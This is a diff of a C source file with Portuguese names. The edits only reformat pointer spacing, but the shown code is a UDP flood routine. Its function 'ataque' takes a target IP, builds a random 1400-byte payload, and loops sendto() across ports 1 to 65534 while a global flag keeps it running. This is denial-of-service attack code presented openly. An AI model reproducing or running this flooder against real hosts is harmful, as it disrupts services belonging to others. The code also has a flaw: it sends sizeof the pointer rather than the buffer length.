@@ -10,7 +10,7 @@
 
 int ativo = 1;
 
-unsigned char * gerarNBytes(size_t numero_bytes) {
+unsigned char *gerarNBytes(size_t numero_bytes) {
 	unsigned char * stream = malloc(numero_bytes);
 	size_t i;
 
@@ -20,11 +20,11 @@ unsigned char * gerarNBytes(size_t numero_bytes) {
 	return stream;
 }
 
-void * ataque(void * ip) {
+void *ataque(void *ip) {
 	int sockfd;
 
 	struct sockaddr_in endereco_alvo;
-	unsigned char * bytes = gerarNBytes(1400);
+	unsigned char *bytes = gerarNBytes(1400);
 	unsigned long long int total_enviado = 0;
 	unsigned short porta = 1;
 
@@ -33,13 +33,13 @@ void * ataque(void * ip) {
 		free(bytes);
 	}
 
-	memset( & endereco_alvo, 0, sizeof(endereco_alvo));
+	memset(&endereco_alvo, 0, sizeof(endereco_alvo));
 	endereco_alvo.sin_family = AF_INET;
-	endereco_alvo.sin_addr.s_addr = *(in_addr_t * ) ip;
+	endereco_alvo.sin_addr.s_addr = *(in_addr_t *) ip;
 
 	while(ativo) {
 		endereco_alvo.sin_port = htons(porta);
-		sendto(sockfd,(unsigned char * ) bytes, sizeof(bytes), MSG_CONFIRM,(const struct sockaddr * ) & endereco_alvo, sizeof(endereco_alvo));
+		sendto(sockfd,(unsigned char *) bytes, sizeof(bytes), MSG_CONFIRM,(const struct sockaddr *) &endereco_alvo, sizeof(endereco_alvo));
 		total_enviado++;
 		porta++;
 		if(porta == 65534) {
